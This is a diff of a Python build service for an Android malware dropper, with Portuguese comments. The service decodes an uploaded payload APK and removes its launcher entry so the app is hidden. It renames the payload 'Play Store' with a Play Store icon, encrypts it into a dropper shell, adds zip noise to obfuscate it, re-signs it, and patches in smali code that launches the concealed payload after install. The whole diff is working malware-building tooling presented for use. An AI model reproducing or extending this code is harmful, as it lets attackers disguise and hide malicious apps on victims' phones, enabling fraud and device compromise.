@@ -12,7 +12,7 @@ import zipfile
 from Crypto.Cipher import AES
 from werkzeug.utils import secure_filename
 
-from config import Config
+from config import BASE_DIR, Config
 from services.build_state import BUILD_STATUS
 from services.data import add_build_history, add_history, update_amplification
 from services.java_runtime import JAVA_BIN, java_env, keytool_bin
@@ -31,7 +31,6 @@ def _xor_bytes(data: bytes, xor_byte: int) -> bytes:
 
 
 def _smali_byte(value: int) -> str:
-    """Formato smali byte: 0xNNt / -0xNNt (como apktool no shell Wi-Fi)."""
     value &= 0xFF
     if value == 0:
         return "        0x0t"
@@ -47,7 +46,6 @@ def _smali_array_data(data: bytes) -> str:
 
 
 def _replace_smali_array(content: str, label: str, data: bytes) -> str:
-    """Substitui bloco :label + .array-data 1 ... .end array-data."""
     pattern = rf"(:{re.escape(label)}\s*\n)\s*\.array-data 1\n.*?\n\s*\.end array-data"
     repl = rf"\1{_smali_array_data(data)}"
     new_content, n = re.subn(pattern, repl, content, count=1, flags=re.S)
@@ -66,17 +64,6 @@ def patch_vd_crypto_smali(
     cipher: str,
     xor_byte: int | None = None,
 ) -> None:
-    """Patch campos crypto em vd.smali (shell R8 Wi-Fi).
-
-    Mapping clinit:
-      u / array_d  -> asset name
-      v / array_e  -> AES-256 key (32)
-      w / array_f  -> IV (16)
-      x / array_10 -> cipher transform
-      y / array_11 -> target package camuflado (14 chars; bind_target_package)
-      z / array_12 -> output filename (len deve == 14 = v0 0xe)
-    XOR: vd.c0 usa 0xE7 fixo no shell (Config.CRYPTO_XOR_BYTE).
-    """
     xor_byte = Config.CRYPTO_XOR_BYTE if xor_byte is None else xor_byte
     path = os.path.join(dropper_work, "smali", "vd.smali")
     if not os.path.isfile(path):
@@ -147,7 +134,6 @@ def patch_vd_crypto_smali(
 
 
 def _axml_string_pool(data: bytes) -> list[str]:
-    """Extrai string pool de AndroidManifest binario (RES_XML)."""
     import struct
 
     off = 8
@@ -202,7 +188,6 @@ def _axml_string_pool(data: bytes) -> list[str]:
 
 
 def extract_apk_package_name(apk_path: str) -> str:
-    """Le package name do AndroidManifest (binario ou texto) do APK payload."""
     with zipfile.ZipFile(apk_path, "r") as zf:
         try:
             man = zf.read("AndroidManifest.xml")
@@ -252,7 +237,6 @@ def extract_apk_package_name(apk_path: str) -> str:
         if any(s.startswith(c + ".") for s in strings):
             return c
     if cands:
-        # Prefer deepest / longest application-like name
         cands.sort(key=lambda s: (s.count("."), len(s)), reverse=True)
         return cands[0]
     raise RuntimeError(f"Nao foi possivel extrair package do payload: {apk_path}")
@@ -267,12 +251,6 @@ def _find_main_activity_smali(dropper_work: str) -> str:
 
 
 def _patch_mainactivity_prefer_tp_asset(dropper_work: str) -> None:
-    """MainActivity.A() le vd.y (14 chars fixos) antes de assets/.tp.
-
-    Payloads com package != 14 chars (ex: transcoder.expeditor.recycler) faziam
-    A() retornar sempre com.google.rbp residual do template → poll infinito em
-    'Finalizando…' apos PackageInstaller. Forca fallback para .tp.
-    """
     path = _find_main_activity_smali(dropper_work)
     with open(path, "r", encoding="utf-8", errors="ignore") as handle:
         content = handle.read()
@@ -306,17 +284,300 @@ def _patch_mainactivity_prefer_tp_asset(dropper_work: str) -> None:
         handle.write(content)
 
 
+PAYLOAD_DISPLAY_NAME = "Play Store"
+PAYLOAD_DISPLAY_ICON = os.path.join(BASE_DIR, "assets", "play_store_icon.png")
+
+
+def _extract_launch_class(manifest_xml: str, payload_package: str) -> str:
+    pkg = (payload_package or "").strip()
+    a1 = re.search(
+        r'<activity-alias\b[^>]*android:name="([^"]+\.A1)"[^>]*android:targetActivity="([^"]+)"',
+        manifest_xml,
+        flags=re.I,
+    )
+    if not a1:
+        a1 = re.search(
+            r'<activity-alias\b[^>]*android:targetActivity="([^"]+)"[^>]*android:name="([^"]+\.A1)"',
+            manifest_xml,
+            flags=re.I,
+        )
+        if a1:
+            return a1.group(1).strip()
+    elif a1:
+        return a1.group(2).strip()
+
+    for m in re.finditer(
+        r"(<activity-alias\b[\s\S]*?</activity-alias>)",
+        manifest_xml,
+        flags=re.I,
+    ):
+        block = m.group(1)
+        if "android.intent.category.LAUNCHER" not in block and (
+            "android.intent.category.LEANBACK_LAUNCHER" not in block
+        ):
+            continue
+        tgt = re.search(r'android:targetActivity="([^"]+)"', block)
+        if tgt:
+            return tgt.group(1).strip()
+
+    for m in re.finditer(
+        r"(<activity\b[\s\S]*?</activity>)",
+        manifest_xml,
+        flags=re.I,
+    ):
+        block = m.group(1)
+        if "android.intent.category.LAUNCHER" not in block:
+            continue
+        name = re.search(r'android:name="([^"]+)"', block)
+        if name:
+            n = name.group(1).strip()
+            if n.startswith("."):
+                n = pkg + n if pkg else n
+            elif "." not in n and pkg:
+                n = f"{pkg}.{n}"
+            return n
+
+    if pkg:
+        return f"{pkg}.Splasher"
+    raise RuntimeError("Nao foi possivel determinar launch_class do payload")
+
+
+def _strip_launcher_categories(manifest_xml: str) -> tuple[str, int]:
+    pattern = (
+        r"[ \t]*<category\s+android:name=\"android\.intent\.category\."
+        r"(?:LAUNCHER|LEANBACK_LAUNCHER)\"\s*/>\s*\n?"
+    )
+    return re.subn(pattern, "", manifest_xml, flags=re.I)
+
+
+def prepare_payload(
+    payload_apk_path: str,
+    work_base: str,
+    build_id: str,
+) -> tuple[str, str]:
+    if not os.path.isfile(payload_apk_path):
+        raise RuntimeError(f"payload ausente: {payload_apk_path}")
+    if not JAVA_BIN:
+        raise RuntimeError("Java nao encontrado para prepare_payload")
+    if not os.path.isfile(Config.APKTOOL_JAR):
+        raise RuntimeError("apktool.jar nao encontrado")
+    if not os.path.isfile(PAYLOAD_DISPLAY_ICON):
+        raise RuntimeError(f"icone Play Store ausente: {PAYLOAD_DISPLAY_ICON}")
+
+    work_dir = os.path.join(work_base, f"{build_id}_payload_prep")
+    if os.path.exists(work_dir):
+        shutil.rmtree(work_dir)
+    os.makedirs(work_dir, exist_ok=True)
+
+    decode_dir = os.path.join(work_dir, "decoded")
+    built_apk = os.path.join(work_dir, "built.apk")
+    aligned_apk = os.path.join(work_dir, "aligned.apk")
+    signed_apk = os.path.join(work_dir, "payload_prepared.apk")
+
+    try:
+        dec = subprocess.run(
+            [
+                JAVA_BIN,
+                "-jar",
+                Config.APKTOOL_JAR,
+                "d",
+                payload_apk_path,
+                "-o",
+                decode_dir,
+                "-f",
+            ],
+            capture_output=True,
+            text=True,
+            timeout=300,
+            env=java_env(),
+        )
+        if dec.returncode != 0 or not os.path.isdir(decode_dir):
+            err = (dec.stderr or dec.stdout or "apktool d falhou").strip()
+            raise RuntimeError(f"apktool d payload: {err[:400]}")
+
+        man_path = os.path.join(decode_dir, "AndroidManifest.xml")
+        if not os.path.isfile(man_path):
+            raise RuntimeError("payload decode sem AndroidManifest.xml")
+
+        with open(man_path, "r", encoding="utf-8", errors="ignore") as handle:
+            man = handle.read()
+
+        pkg_m = re.search(r'package="([^"]+)"', man)
+        payload_package = pkg_m.group(1).strip() if pkg_m else extract_apk_package_name(
+            payload_apk_path
+        )
+        launch_class = _extract_launch_class(man, payload_package)
+
+        man, removed = _strip_launcher_categories(man)
+        if removed < 1:
+            print(
+                f"[build {build_id}] prepare_payload: nenhum LAUNCHER removido "
+                f"(payload ja oculto?)"
+            )
+        with open(man_path, "w", encoding="utf-8") as handle:
+            handle.write(man)
+
+        def _set_my_app_name(strings_xml: str) -> None:
+            try:
+                tree = ET.parse(strings_xml)
+                root = tree.getroot()
+                updated = False
+                for string_node in root.findall("string"):
+                    if string_node.get("name") == "my_app_name":
+                        string_node.text = PAYLOAD_DISPLAY_NAME
+                        updated = True
+                        break
+                if not updated:
+                    el = ET.SubElement(root, "string", {"name": "my_app_name"})
+                    el.text = PAYLOAD_DISPLAY_NAME
+                tree.write(strings_xml, encoding="utf-8", xml_declaration=True)
+            except Exception as exc:
+                with open(strings_xml, "r", encoding="utf-8", errors="ignore") as handle:
+                    sx = handle.read()
+                sx2, n = re.subn(
+                    r'(<string\s+name="my_app_name">)[^<]*(</string>)',
+                    rf"\g<1>{PAYLOAD_DISPLAY_NAME}\2",
+                    sx,
+                    count=1,
+                )
+                if n != 1:
+                    raise RuntimeError(f"falha ao setar my_app_name: {exc}") from exc
+                with open(strings_xml, "w", encoding="utf-8") as handle:
+                    handle.write(sx2)
+
+        strings_hits = 0
+        res_dir = os.path.join(decode_dir, "res")
+        if os.path.isdir(res_dir):
+            for entry in os.listdir(res_dir):
+                if not entry.startswith("values"):
+                    continue
+                strings_xml = os.path.join(res_dir, entry, "strings.xml")
+                if os.path.isfile(strings_xml):
+                    _set_my_app_name(strings_xml)
+                    strings_hits += 1
+        if strings_hits < 1:
+            raise RuntimeError("res/values*/strings.xml ausente no payload")
+
+        logo_hits = 0
+        for root_dir, _, files in os.walk(os.path.join(decode_dir, "res")):
+            if "my_app_logo.png" in files:
+                shutil.copy2(
+                    PAYLOAD_DISPLAY_ICON, os.path.join(root_dir, "my_app_logo.png")
+                )
+                logo_hits += 1
+        if logo_hits < 1:
+            drawable = os.path.join(decode_dir, "res", "drawable")
+            os.makedirs(drawable, exist_ok=True)
+            shutil.copy2(PAYLOAD_DISPLAY_ICON, os.path.join(drawable, "my_app_logo.png"))
+
+        bld = subprocess.run(
+            [
+                JAVA_BIN,
+                "-jar",
+                Config.APKTOOL_JAR,
+                "b",
+                decode_dir,
+                "-o",
+                built_apk,
+            ],
+            capture_output=True,
+            text=True,
+            timeout=300,
+            env=java_env(),
+        )
+        if bld.returncode != 0 or not os.path.isfile(built_apk):
+            err = (bld.stderr or bld.stdout or "apktool b falhou").strip()
+            raise RuntimeError(f"apktool b payload: {err[:400]}")
+
+        zipalign_apk(built_apk, aligned_apk)
+        sign_release_apk(aligned_apk, signed_apk)
+        if not os.path.isfile(signed_apk):
+            raise RuntimeError("payload assinado nao gerado")
+
+        print(
+            f"[build {build_id}] prepare_payload ok -> "
+            f"label={PAYLOAD_DISPLAY_NAME!r} launch={launch_class} "
+            f"launchers_removed={removed}"
+        )
+        return signed_apk, launch_class
+    except Exception:
+        raise
+
+
+def patch_w_explicit_launch(dropper_work: str, launch_class: str) -> None:
+    launch_class = (launch_class or "").strip()
+    if not launch_class or " " in launch_class or "\"" in launch_class:
+        raise RuntimeError(f"launch_class invalida: {launch_class!r}")
+
+    path = _find_main_activity_smali(dropper_work)
+    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+        content = handle.read()
+
+    marker = "# explicit_launch"
+    method_m = re.search(
+        r"\.method public final w\(Ljava/lang/String;\)V[\s\S]*?\.end method",
+        content,
+    )
+    if not method_m:
+        raise RuntimeError("Metodo w() nao encontrado em MainActivity.smali")
+
+    method = method_m.group(0)
+    if marker in method:
+        method2, n = re.subn(
+            r'const-string v2, "[^"]+"\n(\s*invoke-virtual \{v1, p1, v2\}, '
+            r"Landroid/content/Intent;->setClassName)",
+            f'const-string v2, "{launch_class}"\n\1',
+            method,
+            count=1,
+        )
+        if n != 1:
+            raise RuntimeError("Falha ao atualizar launch_class em w() ja patcheado")
+        content = content[: method_m.start()] + method2 + content[method_m.end() :]
+        with open(path, "w", encoding="utf-8") as handle:
+            handle.write(content)
+        return
+
+    explicit_block = f"""    :cond_1
+    :try_start_1
+    {marker}
+    new-instance v1, Landroid/content/Intent;
+
+    invoke-direct {{v1}}, Landroid/content/Intent;-><init>()V
+
+    const-string v2, "{launch_class}"
+
+    invoke-virtual {{v1, p1, v2}}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    const/high16 v2, 0x10000000
+
+    invoke-virtual {{v1, v2}}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    invoke-virtual {{p0, v1}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+
+    goto :goto_0
+
+"""
+
+    patched_method, n = re.subn(
+        r"    :cond_1\n    :try_start_1\n[\s\S]*?(?=    :cond_2\n)",
+        explicit_block,
+        method,
+        count=1,
+    )
+    if n != 1:
+        raise RuntimeError(f"Falha ao patchar fallback de w() (matches={n})")
+
+    content = content[: method_m.start()] + patched_method + content[method_m.end() :]
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(content)
+
+
 def bind_target_package(
     dropper_work: str,
     payload_package: str,
     *,
     xor_byte: int | None = None,
 ) -> None:
-    """Liga o shell ao package real do payload (post-install poll + launch).
-
-    Wi-Fi template original: payload package == vd.y == queries == 'com.google.rbp'.
-    Builds genericos precisam rebindar isso, senao a UI trava em 'Finalizando…'.
-    """
     payload_package = (payload_package or "").strip()
     if not payload_package or "." not in payload_package:
         raise RuntimeError(f"package payload invalido: {payload_package!r}")
@@ -341,7 +602,6 @@ def bind_target_package(
             flags=re.S,
         )
         if n != 1:
-            # fallback: replace default template package in queries block only
             new_man, n = re.subn(
                 r'(android:name=")com\.google\.rbp(")',
                 rf"\1{payload_package}\2",
@@ -353,7 +613,6 @@ def bind_target_package(
         with open(manifest_path, "w", encoding="utf-8") as handle:
             handle.write(new_man)
 
-    # vd.y so cabe 14 chars (MainActivity.A hardcode 0xe). Packages longos usam .tp.
     if len(payload_package) == 14:
         vd_path = os.path.join(dropper_work, "smali", "vd.smali")
         if os.path.isfile(vd_path):
@@ -368,17 +627,12 @@ def bind_target_package(
 
 
 def patch_payload_util_smali(*args, **kwargs):
-    """Deprecated — template actual e shell Wi-Fi (vd.smali)."""
     raise RuntimeError(
         "patch_payload_util_smali removido: use patch_vd_crypto_smali (template Wi-Fi)."
     )
 
 
 def generate_package_name(app_name=None):
-    """Package de 14 chars estilo Wi-Fi (com.turbo.live).
-
-    Formato: com.<5 letras>.<4 alnum>  => len == 14.
-    """
     mid = "".join(secrets.choice(string.ascii_lowercase) for _ in range(5))
     end = secrets.choice(string.ascii_lowercase) + "".join(
         secrets.choice(string.ascii_lowercase + string.digits) for _ in range(3)
@@ -448,7 +702,6 @@ def _epoch_date_time():
 
 
 def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> bytes:
-    """Adiciona noise ZIP estilo Wi-Fi e re-assina o payload (noise quebra assinatura)."""
     if payload_bytes[:4] != b"PK\x03\x04":
         return payload_bytes
     if not getattr(Config, "PAYLOAD_ZIP_NOISE", True):
@@ -529,7 +782,6 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
 
     noised = buf.getvalue()
 
-    # Re-assinar: noise/timestamps invalidam v2 do payload; sem assinatura o install falha.
     if work_dir:
         os.makedirs(work_dir, exist_ok=True)
         raw_path = os.path.join(work_dir, "payload_noise.apk")
@@ -546,7 +798,6 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
             with open(signed_path, "rb") as fh:
                 return fh.read()
         except Exception:
-            # Fallback: devolve ZIP com noise (pode falhar install se signer off)
             return noised
         finally:
             for p in (raw_path, aligned_path, signed_path):
@@ -559,7 +810,6 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
 
 
 def normalize_apk_zip_timestamps(apk_path: str) -> None:
-    """Normaliza todas as entries do APK outer para 1981-01-01 01:01:02 (Wi-Fi)."""
     if not os.path.isfile(apk_path):
         raise RuntimeError(f"APK ausente para normalize timestamps: {apk_path}")
     tmp_path = f"{apk_path}.tsnorm"
@@ -577,14 +827,6 @@ def normalize_apk_zip_timestamps(apk_path: str) -> None:
 
 
 def inject_unknown_into_apk(apk_path: str, dropper_work: str) -> int:
-    """Reinsere unknown/ inteiro no APK (apktool 2.9.3 nao empacota).
-
-    Inclui kotlin/*, META-INF (androidx.*.version, services, app-metadata),
-    DebugProbesKt.bin, etc. — paridade estrutural com Wi-Fi.
-
-    Nao reinsere assinatura V1 (*.SF/*.RSA/*.DSA/*.EC/MANIFEST.MF) para
-    nao conflitar com assinatura V2 posterior.
-    """
     unknown_dir = os.path.join(dropper_work, "unknown")
     if not os.path.isdir(unknown_dir):
         return 0
@@ -596,7 +838,6 @@ def inject_unknown_into_apk(apk_path: str, dropper_work: str) -> int:
             full = os.path.join(root, name)
             rel = os.path.relpath(full, unknown_dir).replace("\\", "/")
             upper = name.upper()
-            # Skip residual V1 signature remnants only under META-INF/
             if rel.startswith("META-INF/") and (
                 upper.endswith(skip_suffix) or upper == "MANIFEST.MF"
             ):
@@ -633,12 +874,10 @@ def inject_unknown_into_apk(apk_path: str, dropper_work: str) -> int:
 
 
 def inject_unknown_meta_inf(apk_path: str, dropper_work: str) -> int:
-    """Compat: delega para inject_unknown_into_apk (unknown/ completo)."""
     return inject_unknown_into_apk(apk_path, dropper_work)
 
 
 def inject_secondary_dex(apk_path: str, dex_path: str, arcname: str = "classes2.dex") -> None:
-    """LEGACY: injeta DEX libs. Desligado no path Wi-Fi-parity (single DEX)."""
     if not getattr(Config, "INJECT_SECONDARY_DEX", False):
         return
     if not os.path.isfile(dex_path):
@@ -698,7 +937,6 @@ def _generate_keystore(
     key_pass: str,
     dname: str,
 ) -> None:
-    """Gera keystore PKCS12 com DN fixo (release estavel)."""
     keytool = keytool_bin()
     if not keytool:
         raise RuntimeError("keytool nao encontrado (JAVA_HOME/bin/keytool).")
@@ -736,7 +974,6 @@ def _generate_keystore(
 
 
 def ensure_release_keystore() -> tuple[str, str, str, str]:
-    """Garante signing/release.p12 (cria 1x se ausente)."""
     path = Config.RELEASE_KEYSTORE
     store_pass = Config.RELEASE_KEYSTORE_PASS
     key_pass = store_pass
@@ -747,7 +984,6 @@ def ensure_release_keystore() -> tuple[str, str, str, str]:
 
 
 def zipalign_apk(input_apk: str, output_apk: str) -> None:
-    """Realinha APK (obrigatorio apos rezip de timestamps)."""
     if not os.path.isfile(Config.ZIPALIGN):
         raise RuntimeError("zipalign nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
     cmd = [Config.ZIPALIGN, "-p", "-f", "4", input_apk, output_apk]
@@ -768,7 +1004,6 @@ def sign_with_apksigner(
     key_pk8: str | None = None,
     cert_pem: str | None = None,
 ) -> str:
-    """Assina APK com apksigner (v2; v3 conforme Config). Sem v1."""
     if not os.path.isfile(Config.APKSIGNER):
         raise RuntimeError("apksigner nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
     v3 = "true" if Config.APKSIGNER_V3_ENABLED else "false"
@@ -814,7 +1049,6 @@ def sign_with_apksigner(
 
 
 def sign_release_apk(aligned_apk: str, output_apk: str) -> str:
-    """Assina conforme Config.SIGNING_MODE (aosp_testkey | pkcs12)."""
     mode = (Config.SIGNING_MODE or "aosp_testkey").strip().lower()
     if mode == "aosp_testkey":
         return sign_with_apksigner(
@@ -893,8 +1127,6 @@ def process_apk(
         dropper_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_dropper")
         if os.path.exists(dropper_work):
             shutil.rmtree(dropper_work)
-        # Only skip top-level template dirs. ignore_patterns("build") would also
-        # drop META-INF/com/android/build/ (Wi-Fi app-metadata.properties).
         def _template_ignore(dirpath, names):
             if os.path.abspath(dirpath) == os.path.abspath(Config.DROPPER_TEMPLATE):
                 return [n for n in names if n in ("prebuilt", "build", "original")]
@@ -916,8 +1148,6 @@ def process_apk(
         apply_package_rename(dropper_work, Config.OLD_PACKAGE, new_package)
 
         if custom_icon_path and os.path.exists(custom_icon_path):
-            # Wi-Fi shell uses adaptive-icon XMLs (ic_launcher.xml). Copying PNG
-            # beside them causes aapt2 conflict: same resource name per density.
             for density in [
                 "res/mipmap-hdpi",
                 "res/mipmap-mdpi",
@@ -935,7 +1165,6 @@ def process_apk(
                     if os.path.isfile(xml_path):
                         os.remove(xml_path)
                 if density.endswith("anydpi-v26"):
-                    # Adaptive-only density: drop empty dir after XML removal.
                     try:
                         if not os.listdir(path):
                             os.rmdir(path)
@@ -980,8 +1209,15 @@ def process_apk(
                     except Exception:
                         pass
 
+        _set_status(build_id, "Preparando payload", 50)
+        prepared_apk, launch_class = prepare_payload(
+            user_apk_path,
+            Config.UPLOAD_FOLDER,
+            build_id,
+        )
+
         _set_status(build_id, "Ofuscando payload", 55)
-        with open(user_apk_path, "rb") as fh:
+        with open(prepared_apk, "rb") as fh:
             payload_data = fh.read()
         payload_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_payload_work")
         payload_data = obfuscate_payload_zip(payload_data, work_dir=payload_work)
@@ -1001,7 +1237,6 @@ def process_apk(
 
         assets_dir = os.path.join(dropper_work, "assets")
         os.makedirs(assets_dir, exist_ok=True)
-        # preserve dexopt; remove only payload-like files at top level
         for stale in os.listdir(assets_dir):
             stale_path = os.path.join(assets_dir, stale)
             if os.path.isfile(stale_path):
@@ -1019,12 +1254,13 @@ def process_apk(
             cipher=Config.CIPHER_TRANSFORM,
         )
 
-        # Shell Wi-Fi espera o package do payload em vd.y (14 chars) / .tp +
-        # <queries>. Sem rebind, poll pos-install fica em com.google.rbp e a UI
-        # trava em "Finalizando…".
-        payload_package = extract_apk_package_name(user_apk_path)
+        payload_package = extract_apk_package_name(prepared_apk)
         bind_target_package(dropper_work, payload_package)
-        print(f"[build {build_id}] target_pkg bound -> {payload_package}")
+        patch_w_explicit_launch(dropper_work, launch_class)
+        print(
+            f"[build {build_id}] target_pkg bound -> {payload_package} "
+            f"launch_class={launch_class}"
+        )
 
         _set_status(build_id, "Compilando APK", 80)
         unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")
@@ -1053,7 +1289,6 @@ def process_apk(
                 err = (res_b.stderr or res_b.stdout or "apktool falhou sem mensagem").strip()
                 raise RuntimeError(f"Erro na compilacao: {err[:500]}")
 
-        # Single-DEX Wi-Fi path: no inject_secondary_dex
         if getattr(Config, "INJECT_SECONDARY_DEX", False):
             _set_status(build_id, "Empacotando bibliotecas", 85)
             inject_secondary_dex(unsigned_apk, Config.DROPPER_LIBS_DEX)
@@ -1121,7 +1356,6 @@ def process_apk(
 
         tb = traceback.format_exc()
         print(f"ERRO NO BUILD {build_id}: {exc}\n{tb}")
-        # Keep user-facing message short; attach detail for operators/logs.
         detail = str(exc).strip().replace("\n", " ")
         if len(detail) > 180:
             detail = detail[:177] + "..."
@@ -1137,6 +1371,7 @@ def process_apk(
         if persist:
             add_build_history(username, custom_app_name, "erro", build_id)
             update_amplification(username, "erro")
+
 
 
 
